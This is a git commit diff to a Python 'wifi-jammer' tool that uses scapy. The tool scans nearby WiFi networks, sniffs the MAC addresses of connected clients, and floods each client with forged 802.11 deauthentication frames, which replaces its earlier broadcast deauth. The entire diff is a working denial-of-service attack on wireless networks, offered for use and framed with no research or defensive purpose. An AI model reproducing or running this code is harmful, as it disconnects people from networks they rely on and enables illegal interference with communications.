f3e132469c85a95dddd03ac00f9401c721607cc1
mogwai <vmichel@intechinfo.fr>
2020-05-17 16:20:43 +0200

    attack client, not broadcast address

--- wifi-jammer/jammer.py
+++ wifi-jammer/jammer.py
@@ -11,77 +11,40 @@ parser = argparse.ArgumentParser(description='Jam WiFi network by sending deauth
 parser.add_argument('IFACE', help='Network Interface to use', type=str)
 args = parser.parse_args()
 
-if os.geteuid() != 0:
-    print("You should run this program as root")
-    sys.exit(1)
-
 iface = args.IFACE
-networks = dict()
 
+from modules.networksclients import *
 
-def monitor(mode, iface=iface):
-    if mode == 'on':
-        os.system('ip l set ' + iface + ' down')
-        os.system('iw dev ' + iface + ' set monitor none')
-        os.system('ip l set ' + iface + ' up')
-        print('Monitor mode enabled on ' +iface)
-    if mode == 'off':
-        os.system('ip l set ' + iface + ' down')
-        os.system('iw dev ' + iface + ' set type managed')
-        os.system('ip l set ' + iface + ' up')
-        print('Monitor mode disabled on ' +iface)
+check_perm()
+monitor('on', iface=iface)
 
-def callback_ap(packet):
-    if packet.haslayer(Dot11Beacon):
-        bssid = packet[Dot11].addr2
-        ssid = packet[Dot11].info.decode()
-        if ssid not in networks:
-            print(ssid)
-            networks[ssid] = bssid
-
-def change_channel(iface=iface):
-    ch = 1
-    while True:
-        os.system(f"iwconfig {iface} channel {ch}")
-        # switch channel from 1 to 13 each 0.5s
-        ch = ch % 13 + 1
-        time.sleep(0.5)
-
-def choose_from_networks(networks=networks) -> list:
-    menu_items = []
-    selection = []
-    for ssid in networks:
-        menu_items.append(ssid)
-    for i in range(len(menu_items)):
-        print('{} - {}'.format(i, menu_items[i]))
-
-    choice = str(input('Which network would you like to jam ? \nYou can specify multiple networks by separating their index by an empty space \n > '))
-    for index in choice.split(' '):
-        selection.append(networks[menu_items[int(index)]])
-    return selection
-
-def jam_network(ap:str, client:str, iface=iface):
-    deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
-    sendp(deauth_packet, iface=iface)
 
 try :
-    channel_changer = Thread(target=change_channel)
-    channel_changer.daemon = True
-    channel_changer.start()
-    monitor('on')
-    sniff(prn=callback_ap, iface=iface, timeout=10)
-    channel_changer.join(timeout=1)
-    ap_list = choose_from_networks()
-    client = 'ff:ff:ff:ff:ff:ff'
+    ap_list = choose_from_networks(get_networks(iface=iface))
 except :
-    monitor('off')
+    monitor('off', iface=iface)
+    sys.exit(1)
+
+chan_list = get_chan_list(ap_list)
+channel_sweeper = Thread(target=channel_sweep, kwargs=dict(chan_list=chan_list, iface=iface))
+channel_sweeper.daemon = True
+channel_sweeper.start()
+
+sniffer = Thread(target=sniff_clients, kwargs=dict(iface=iface))
+sniffer.daemon = True
+sniffer.start()
+
+sniffer.join()
+while True:
+    sniffer.start
+    clients = get_client()
+    print(clients)
+    client_list = []
+    for ap in ap_list:
+        client_list += ap.get_client_list(clients)
+
+    jam_network(client_list, iface=iface, loop=20)
+    sniffer.join()
 
 
-try:
-    while True:
-        for ap in ap_list:
-            jam_network(ap, client)
-except KeyboardInterrupt:
-    pass
-
-monitor('off')
+#monitor('off', iface=iface)
---
+++ wifi-jammer/modules/networksclients.py
@@ -0,0 +1,156 @@
+#! /usr/bin/env python3
+
+from scapy.all import *
+from threading import Thread, currentThread
+import time
+import os
+import sys
+
+def check_perm():
+    if os.geteuid() != 0:
+        print("You should run this program as root")
+        sys.exit(1)
+
+#iface=args.IFACE
+networks = dict()
+clients = []
+unique = []
+
+class Client:
+
+    def __init__(self, ap, addr):
+        self.ap = ap
+        self.addr = addr
+
+    def jam():
+        #todo
+        pass
+
+class Network:
+
+    def __init__(self, bssid, essid, channel):
+        self.bssid = bssid
+        self.essid = essid
+        self.channel = channel
+    
+    def get_client_list(self, clients) -> list:
+        client_list = []
+        for couple in clients:
+            if self.bssid == couple[0]:
+                client_list.append(Client(self.bssid, couple[1]))
+            elif self.bssid == couple[1]:
+                client_list.append(Client(self.bssid, couple[0]))
+        return client_list
+
+def test(net) -> list:
+    global clients
+    return net.get_client_list(clients)
+
+def monitor(mode, iface):
+    if mode == 'on':
+        os.system('ip l set ' + iface + ' down')
+        os.system('iw dev ' + iface + ' set monitor none')
+        os.system('ip l set ' + iface + ' up')
+        print('Monitor mode enabled on ' +iface)
+    if mode == 'off':
+        os.system('ip l set ' + iface + ' down')
+        os.system('iw dev ' + iface + ' set type managed')
+        os.system('ip l set ' + iface + ' up')
+        print('Monitor mode disabled on ' +iface)
+
+def sniff_clients(iface) :
+    global clients
+
+    sniff(prn=callback_client, iface=iface, timeout=20)
+
+def get_client() -> list:
+    global clients
+    return clients
+
+def get_chan_list(ap_list:list) -> list:
+    chan_list = []
+    for ap in ap_list:
+        chan_list.append(ap.channel)
+    return chan_list
+
+def get_networks(iface) -> list:
+    global networks
+    net_list = []
+    channel_sweeper = Thread(target=channel_sweep, kwargs=dict(iface=iface))
+    channel_sweeper.start()
+    sniff(prn=callback_ap, iface=iface, timeout=13)
+    channel_sweeper.stop = False
+    channel_sweeper.join(timeout=1)
+
+    for ssid in networks:
+        params = {'bssid': networks[ssid]['bssid'], 'essid': ssid, 'channel': networks[ssid]['channel']}
+        net_list.append(Network(**params))
+    return net_list
+
+def callback_client(pkt) :
+    global unique
+    global clients
+    try:
+        if pkt.subtype == 0 or pkt.subtype == 8 :
+            if pkt.addr1 != 'ff:ff:ff:ff:ff:ff' :
+                if pkt.addr1 not in unique or pkt.addr2 not in unique:
+                    clients.append([pkt.addr1, pkt.addr2])
+                if pkt.addr1 not in unique:
+                    unique.append(pkt.addr1)
+                if pkt.addr2 not in unique:
+                    unique.append(pkt.addr2)
+    except:
+        pass
+
+def callback_ap(pkt) :
+    if pkt.haslayer(Dot11Beacon):
+        bssid = pkt[Dot11].addr2
+        ssid = pkt[Dot11].info.decode()
+        stats = pkt[Dot11Beacon].network_stats()
+        channel = stats.get('channel')
+        if ssid not in networks:
+            print(ssid)
+            networks[ssid] = {'bssid': bssid, 'channel': channel}
+
+def set_channel(ch, iface):
+    os.system(f"iwconfig {iface} channel {ch}")
+
+def channel_sweep(iface, chan_list=None):
+    t = currentThread()
+    t.stop = True
+    if chan_list is None:
+        ch = 1
+        while getattr(t, 'stop', True):
+            set_channel(ch, iface=iface)
+            # switch channel from 1 to 13 each 0.5s
+            ch = ch % 13 + 1
+            time.sleep(0.5)
+    else:
+        while getattr(t, 'stop', True):
+            for ch in chan_list:
+                set_channel(ch, iface=iface)
+                time.sleep(0.5)
+
+def choose_from_networks(networks:list) -> list:
+    selection = []
+    for i in range(len(networks)):
+        print('{} - {}'.format(i, networks[i].essid))
+
+    choice = input('Which network would you like to jam ? \nYou can specify multiple networks by separating their index by an empty space \n> ')
+
+    for i in choice.split(' '):
+        selection.append(networks[int(i)])
+    return selection
+
+def jam_network(target_list:list, iface, loop:int):
+    packets = []
+    for target in target_list:
+        deauth_packet = RadioTap()/Dot11(addr1=target.addr, addr2=target.ap, addr3=target.ap)/Dot11Deauth()
+        packets.append(deauth_packet)
+    try:
+        for i in range(loop):
+            for packet in packets:
+                sendp(packet, iface=iface)
+                time.sleep(1)
+    except:
+        pass
